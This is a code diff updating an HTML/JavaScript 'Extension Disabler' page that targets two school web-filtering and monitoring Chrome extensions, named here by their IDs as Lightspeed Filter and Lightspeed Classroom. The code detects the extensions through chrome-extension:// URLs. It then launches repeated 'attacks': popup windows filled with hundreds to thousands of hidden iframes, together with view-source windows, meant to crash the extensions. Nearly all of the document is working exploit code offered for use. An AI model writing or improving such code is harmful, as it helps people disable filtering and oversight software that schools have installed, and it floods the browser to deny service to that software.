@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Nyxos Toolkit v7.0</title>
+    <title>Nyxos Toolkit v8.0</title>
     <style>
         :root {
             --bg: #0d1117;
@@ -52,6 +52,7 @@
         }
         button:hover:not(:disabled) {
             opacity: 0.9;
+            transform: translateY(-1px);
         }
         .status {
             position: fixed;
@@ -63,164 +64,242 @@
             border-radius: 4px;
             font-size: 12px;
         }
-        .target-list {
+        .target-container {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
             margin-top: 15px;
         }
         .target-item {
-            margin-bottom: 10px;
             padding: 10px;
             background: rgba(0,0,0,0.2);
             border-radius: 4px;
-            display: flex;
-            justify-content: space-between;
+            position: relative;
         }
-        .detection-status {
+        .target-status {
+            position: absolute;
+            right: 10px;
+            top: 10px;
             padding: 3px 8px;
             border-radius: 4px;
             font-size: 12px;
             font-weight: bold;
         }
-        .detected {
-            background: var(--success);
-        }
-        .missing {
+        .detected { background: var(--success); }
+        .missing { background: var(--danger); }
+        .attacking { 
             background: var(--danger);
+            animation: pulse 0.5s infinite;
         }
-        .checking {
-            background: var(--warning);
-        }
-        .attack-active {
-            animation: pulse 1s infinite;
+        .attack-log {
+            height: 100px;
+            overflow-y: scroll;
+            background: black;
+            padding: 10px;
+            font-family: monospace;
+            border-radius: 4px;
         }
         @keyframes pulse {
             0% { opacity: 1; }
             50% { opacity: 0.7; }
             100% { opacity: 1; }
         }
+        .progress-bar {
+            height: 4px;
+            background: var(--accent);
+            width: 0%;
+            transition: width 0.3s;
+            margin-top: 5px;
+            border-radius: 2px;
+        }
+        .slider-container {
+            margin: 15px 0;
+        }
+        .slider-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 5px;
+        }
+        input[type="range"] {
+            width: 100%;
+        }
+        .switch {
+            position: relative;
+            display: inline-block;
+            width: 60px;
+            height: 34px;
+            margin-left: 10px;
+        }
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #484f58;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        .slider:before {
+            position: absolute;
+            content: "";
+            height: 26px;
+            width: 26px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        input:checked + .slider {
+            background-color: var(--accent);
+        }
+        input:checked + .slider:before {
+            transform: translateX(26px);
+        }
+        .ripple {
+            position: absolute;
+            border-radius: 50%;
+            background-color: rgba(255, 255, 255, 0.7);
+            transform: scale(0);
+            animation: ripple 0.6s linear;
+            pointer-events: none;
+        }
+        @keyframes ripple {
+            to {
+                transform: scale(4);
+                opacity: 0;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>Nyxos Toolkit v7.0</h1>
-        <p>Dual Extension Detection & Disabler</p>
+        <h1>Nyxos Toolkit v8.0</h1>
+        <p>Ultimate Extension Disabler</p>
     </div>
 
     <div class="panel">
-        <h2>System Check</h2>
-        <div class="target-list" id="detectionResults">
-            <p>Detecting installed extensions...</p>
+        <h2>Target Status</h2>
+        <div class="target-container" id="targetStatus">
+            <!-- Filled by JavaScript -->
         </div>
     </div>
 
-    <div class="panel" id="attackPanel" style="display: none;">
+    <div class="panel">
         <h2>Attack Controls</h2>
-        <button id="startAttack">Start Continuous Attack</button>
+        <div class="slider-container">
+            <div class="slider-label">
+                <span>Attack Intensity: <span id="iframeCountValue">500</span> iframes</span>
+            </div>
+            <input type="range" min="100" max="5000" value="500" class="slider" id="iframeCountSlider">
+        </div>
+        <button id="startAttack">Start Dual Attack</button>
         <button id="stopAttack" disabled>Stop Attack</button>
-        <div class="target-list" id="attackStatus"></div>
+        <div class="progress-bar" id="attackProgress"></div>
+    </div>
+
+    <div class="panel">
+        <h2>Advanced Options</h2>
+        <label>
+            <input type="checkbox" id="autoRefresh">
+            Auto-refresh after attack
+            <span class="switch">
+                <input type="checkbox" id="autoRefreshToggle">
+                <span class="slider"></span>
+            </span>
+        </label>
+        <label>
+            <input type="checkbox" id="devMode">
+            Developer Mode
+            <span class="switch">
+                <input type="checkbox" id="devModeToggle">
+                <span class="slider"></span>
+            </span>
+        </label>
     </div>
 
     <div class="panel">
         <h2>Attack Log</h2>
-        <div id="attackLog" style="height: 100px; overflow-y: scroll; background: black; padding: 10px; font-family: monospace;"></div>
+        <div class="attack-log" id="attackLog"></div>
     </div>
 
     <div class="status" id="status">Status: Initializing...</div>
 
     <script>
         // Extension targets
-        const TARGETS = {
-            lightspeedFilter: {
+        const TARGETS = [
+            {
                 id: 'adkcpkpghahmbopkjchobieckeoaoeem',
                 name: 'Lightspeed Filter',
                 detected: false,
-                active: false
+                attacking: false
             },
-            lightspeedClassroom: {
+            {
                 id: 'kkbmdgjggcdajckdlbngdjonpchpaiea',
                 name: 'Lightspeed Classroom',
                 detected: false,
-                active: false
+                attacking: false
             }
-        };
+        ];
 
+        // Attack system variables
         let attackInterval = null;
-        let attackSpeed = 1000; // 1 second between attacks
-        let allExtensionsDetected = false;
+        let attackCycle = 0;
+        const MAX_CYCLES = 20;
+        let iframeCount = 500;
+        let autoRefresh = false;
+        let devMode = false;
 
-        function logMessage(message) {
-            const log = document.getElementById('attackLog');
-            log.innerHTML += `[${new Date().toLocaleTimeString()}] ${message}<br>`;
-            log.scrollTop = log.scrollHeight;
+        // DOM elements
+        const startBtn = document.getElementById('startAttack');
+        const stopBtn = document.getElementById('stopAttack');
+        const statusEl = document.getElementById('status');
+        const logEl = document.getElementById('attackLog');
+        const progressBar = document.getElementById('attackProgress');
+        const iframeSlider = document.getElementById('iframeCountSlider');
+        const iframeCountEl = document.getElementById('iframeCountValue');
+        const autoRefreshToggle = document.getElementById('autoRefreshToggle');
+        const devModeToggle = document.getElementById('devModeToggle');
+
+        // Initialize the UI
+        function initUI() {
+            const targetStatus = document.getElementById('targetStatus');
+            targetStatus.innerHTML = TARGETS.map(target => `
+                <div class="target-item" id="target-${target.id}">
+                    <strong>${target.name}</strong>
+                    <div>ID: ${target.id}</div>
+                    <div class="target-status ${target.detected ? 'detected' : 'missing'}">
+                        ${target.detected ? 'DETECTED' : 'MISSING'}
+                    </div>
+                </div>
+            `).join('');
         }
 
-        function updateStatus(text, isError = false) {
-            const status = document.getElementById('status');
-            status.textContent = `Status: ${text}`;
-            status.style.background = isError ? 'var(--danger)' : 'var(--accent)';
+        // Log messages to the attack log
+        function log(message) {
+            const timestamp = new Date().toLocaleTimeString();
+            logEl.innerHTML += `<div>[${timestamp}] ${message}</div>`;
+            logEl.scrollTop = logEl.scrollHeight;
         }
 
-        // Detect if extensions are installed
-        async function detectExtensions() {
-            let detectionCount = 0;
-            
-            for (const [key, target] of Object.entries(TARGETS)) {
-                updateDetectionStatus(target, 'checking');
-                
-                try {
-                    // Try to load extension resource
-                    const detected = await checkExtensionExists(target.id);
-                    TARGETS[key].detected = detected;
-                    updateDetectionStatus(target, detected ? 'detected' : 'missing');
-                    
-                    if (detected) detectionCount++;
-                } catch (e) {
-                    TARGETS[key].detected = false;
-                    updateDetectionStatus(target, 'missing');
-                }
-            }
-            
-            allExtensionsDetected = detectionCount === Object.keys(TARGETS).length;
-            
-            if (allExtensionsDetected) {
-                document.getElementById('attackPanel').style.display = 'block';
-                updateStatus('Both target extensions detected');
-                logMessage('System ready - both targets detected');
-            } else {
-                updateStatus('Missing required extensions', true);
-                logMessage('Error: Required extensions not detected');
-            }
+        // Update system status
+        function updateStatus(message, isError = false) {
+            statusEl.textContent = `Status: ${message}`;
+            statusEl.style.background = isError ? 'var(--danger)' : 'var(--accent)';
         }
 
-        function updateDetectionStatus(target, status) {
-            const results = document.getElementById('detectionResults');
-            const existing = document.getElementById(`detect-${target.id}`);
-            
-            if (existing) {
-                existing.querySelector('.detection-status').className = `detection-status ${status}`;
-                existing.querySelector('.detection-status').textContent = 
-                    status === 'detected' ? 'DETECTED' : 
-                    status === 'missing' ? 'MISSING' : 'CHECKING';
-                return;
-            }
-            
-            const div = document.createElement('div');
-            div.className = 'target-item';
-            div.id = `detect-${target.id}`;
-            div.innerHTML = `
-                <span>${target.name} (${target.id})</span>
-                <span class="detection-status ${status}">
-                    ${status === 'detected' ? 'DETECTED' : 
-                      status === 'missing' ? 'MISSING' : 'CHECKING'}
-                </span>
-            `;
-            results.appendChild(div);
-        }
-
-        // Check if extension exists by trying to load its resource
-        function checkExtensionExists(extId) {
+        // Check if extension exists
+        async function detectExtension(target) {
             return new Promise((resolve) => {
                 const iframe = document.createElement('iframe');
-                iframe.src = `chrome-extension://${extId}/manifest.json`;
+                iframe.src = `chrome-extension://${target.id}/manifest.json`;
                 iframe.style.display = 'none';
                 
                 iframe.onload = () => {
@@ -233,107 +312,235 @@
                     resolve(false);
                 };
                 
-                // Timeout fallback
                 setTimeout(() => {
                     iframe.remove();
                     resolve(false);
-                }, 2000);
+                }, 1500);
                 
                 document.body.appendChild(iframe);
             });
         }
 
-        // Attack functions
-        async function disableExtension(target) {
-            return new Promise((resolve) => {
-                try {
-                    // Method 1: Try to open extension page in iframe
-                    const iframe = document.createElement('iframe');
+        // Detect all targets
+        async function detectAllExtensions() {
+            let allDetected = true;
+            
+            for (const target of TARGETS) {
+                target.detected = await detectExtension(target);
+                updateTargetUI(target);
+                
+                if (!target.detected) allDetected = false;
+            }
+            
+            return allDetected;
+        }
+
+        // Update target UI
+        function updateTargetUI(target) {
+            const targetEl = document.getElementById(`target-${target.id}`);
+            if (!targetEl) return;
+            
+            const statusEl = targetEl.querySelector('.target-status');
+            statusEl.className = `target-status ${target.detected ? 'detected' : 'missing'}`;
+            statusEl.textContent = target.detected ? 
+                (target.attacking ? 'ATTACKING' : 'DETECTED') : 
+                'MISSING';
+            
+            if (target.attacking) {
+                statusEl.classList.add('attacking');
+            } else {
+                statusEl.classList.remove('attacking');
+            }
+        }
+
+        // Attack an individual extension
+        async function attackExtension(target) {
+            if (!target.detected) return false;
+            
+            try {
+                // Create attack window
+                const attackWindow = window.open('', '_blank', 'width=100,height=100');
+                if (!attackWindow) return false;
+                
+                // Add iframes to attack window
+                const iframeContainer = attackWindow.document.createElement('div');
+                attackWindow.document.body.appendChild(iframeContainer);
+                
+                // Add massive number of iframes
+                for (let i = 0; i < iframeCount; i++) {
+                    const iframe = attackWindow.document.createElement('iframe');
                     iframe.src = `chrome-extension://${target.id}/main.js`;
                     iframe.style.display = 'none';
-                    
-                    iframe.onload = iframe.onerror = () => {
-                        setTimeout(() => {
-                            iframe.remove();
-                            // Method 2: Open view-source to crash extension
-                            try {
-                                const win = window.open(`view-source:chrome-extension://${target.id}/main.js`, '_blank');
-                                setTimeout(() => win && win.close(), 100);
-                            } catch (e) {}
-                            resolve(true);
-                        }, 100);
-                    };
-                    
-                    document.body.appendChild(iframe);
-                } catch (e) {
-                    resolve(false);
+                    iframeContainer.appendChild(iframe);
                 }
-            });
-        }
-
-        async function attackExtensions() {
-            if (!allExtensionsDetected) return;
-            
-            for (const [key, target] of Object.entries(TARGETS)) {
-                if (!target.detected) continue;
                 
-                const success = await disableExtension(target);
-                TARGETS[key].active = success;
-                updateAttackStatus();
-                logMessage(`${target.name}: ${success ? 'ATTACKED' : 'FAILED'}`);
+                // Add view-source attack
+                const viewSourceWindow = window.open(
+                    `view-source:chrome-extension://${target.id}/main.js`, 
+                    '_blank'
+                );
+                
+                // Cleanup
+                setTimeout(() => {
+                    if (attackWindow && !attackWindow.closed) {
+                        attackWindow.close();
+                    }
+                    if (viewSourceWindow && !viewSourceWindow.closed) {
+                        viewSourceWindow.close();
+                    }
+                }, 100);
+                
+                return true;
+            } catch (e) {
+                return false;
             }
-            updateStatus(`Attacking - ${new Date().toLocaleTimeString()}`);
         }
 
-        function updateAttackStatus() {
-            const status = document.getElementById('attackStatus');
-            status.innerHTML = Object.values(TARGETS)
-                .filter(target => target.detected)
-                .map(target => `
-                    <div class="target-item">
-                        <span>${target.name}</span>
-                        <span class="detection-status ${target.active ? 'attack-active' : ''}">
-                            ${target.active ? 'UNDER ATTACK' : 'INACTIVE'}
-                        </span>
-                    </div>
-                `).join('');
+        // Attack all detected extensions
+        async function attackAllExtensions() {
+            attackCycle++;
+            progressBar.style.width = `${(attackCycle / MAX_CYCLES) * 100}%`;
+            
+            // Refresh detection periodically
+            if (attackCycle % 5 === 0) {
+                await detectAllExtensions();
+            }
+            
+            let attackResults = await Promise.all(
+                TARGETS.map(async target => {
+                    if (!target.detected) return false;
+                    
+                    target.attacking = true;
+                    updateTargetUI(target);
+                    
+                    const result = await attackExtension(target);
+                    log(`${target.name}: ${result ? 'Attack successful' : 'Attack failed'}`);
+                    
+                    target.attacking = false;
+                    updateTargetUI(target);
+                    
+                    return result;
+                })
+            );
+            
+            // Check if we should stop
+            if (attackCycle >= MAX_CYCLES || !attackResults.some(r => r)) {
+                stopAttack();
+                
+                if (attackCycle >= MAX_CYCLES && autoRefresh) {
+                    log("Attack cycle completed - refreshing page");
+                    setTimeout(() => location.reload(), 1000);
+                }
+            }
+        }
+
+        // Start the attack
+        function startAttack() {
+            if (attackInterval) return;
+            
+            attackCycle = 0;
+            progressBar.style.width = '0%';
+            
+            startBtn.disabled = true;
+            stopBtn.disabled = false;
+            
+            log("Starting dual extension attack...");
+            updateStatus("Attacking both extensions");
+            
+            // Immediate first attack
+            attackAllExtensions();
+            
+            // Continuous attacks
+            attackInterval = setInterval(attackAllExtensions, 500);
+        }
+
+        // Stop the attack
+        function stopAttack() {
+            if (!attackInterval) return;
+            
+            clearInterval(attackInterval);
+            attackInterval = null;
+            
+            startBtn.disabled = false;
+            stopBtn.disabled = true;
+            
+            TARGETS.forEach(t => {
+                t.attacking = false;
+                updateTargetUI(t);
+            });
+            
+            log("Attack stopped");
+            updateStatus("Ready");
+            progressBar.style.width = '0%';
+        }
+
+        // Initialize the system
+        async function init() {
+            initUI();
+            log("System initializing...");
+            updateStatus("Detecting extensions");
+            
+            const allDetected = await detectAllExtensions();
+            
+            if (allDetected) {
+                log("Both target extensions detected - ready to attack");
+                updateStatus("Ready");
+                startBtn.disabled = false;
+            } else {
+                log("Error: Required extensions not detected");
+                updateStatus("Missing targets", true);
+                startBtn.disabled = true;
+            }
         }
 
         // Event listeners
-        document.getElementById('startAttack').addEventListener('click', () => {
-            if (attackInterval || !allExtensionsDetected) return;
-            
-            logMessage('Starting continuous attack...');
-            document.getElementById('startAttack').disabled = true;
-            document.getElementById('stopAttack').disabled = false;
-            
-            attackExtensions(); // Immediate attack
-            attackInterval = setInterval(attackExtensions, attackSpeed);
+        startBtn.addEventListener('click', startAttack);
+        stopBtn.addEventListener('click', stopAttack);
+
+        iframeSlider.addEventListener('input', () => {
+            iframeCount = parseInt(iframeSlider.value);
+            iframeCountEl.textContent = iframeCount;
         });
 
-        document.getElementById('stopAttack').addEventListener('click', () => {
-            if (attackInterval) {
-                clearInterval(attackInterval);
-                attackInterval = null;
-                document.getElementById('startAttack').disabled = false;
-                document.getElementById('stopAttack').disabled = true;
-                
-                // Reset attack states
-                Object.values(TARGETS).forEach(target => {
-                    target.active = false;
-                });
-                updateAttackStatus();
-                
-                logMessage('Attack stopped');
-                updateStatus('Ready');
+        autoRefreshToggle.addEventListener('change', () => {
+            autoRefresh = autoRefreshToggle.checked;
+        });
+
+        devModeToggle.addEventListener('change', () => {
+            devMode = devModeToggle.checked;
+            if (devMode) {
+                if (!confirm("Enable developer mode? This may expose advanced features.")) {
+                    devModeToggle.checked = false;
+                    devMode = false;
+                }
             }
         });
 
-        // Initialize
-        document.addEventListener('DOMContentLoaded', () => {
-            logMessage('System initializing...');
-            detectExtensions();
+        // Add ripple effect to buttons
+        document.querySelectorAll('button').forEach(button => {
+            button.addEventListener('click', function(e) {
+                const ripple = document.createElement('span');
+                ripple.classList.add('ripple');
+                
+                const rect = this.getBoundingClientRect();
+                const size = Math.max(rect.width, rect.height);
+                ripple.style.width = ripple.style.height = `${size}px`;
+                
+                const x = e.clientX - rect.left - size / 2;
+                const y = e.clientY - rect.top - size / 2;
+                ripple.style.left = `${x}px`;
+                ripple.style.top = `${y}px`;
+                
+                this.appendChild(ripple);
+                
+                setTimeout(() => {
+                    ripple.remove();
+                }, 600);
+            });
         });
+
+        // Start the system
+        document.addEventListener('DOMContentLoaded', init);
     </script>
 </body>
 </html>
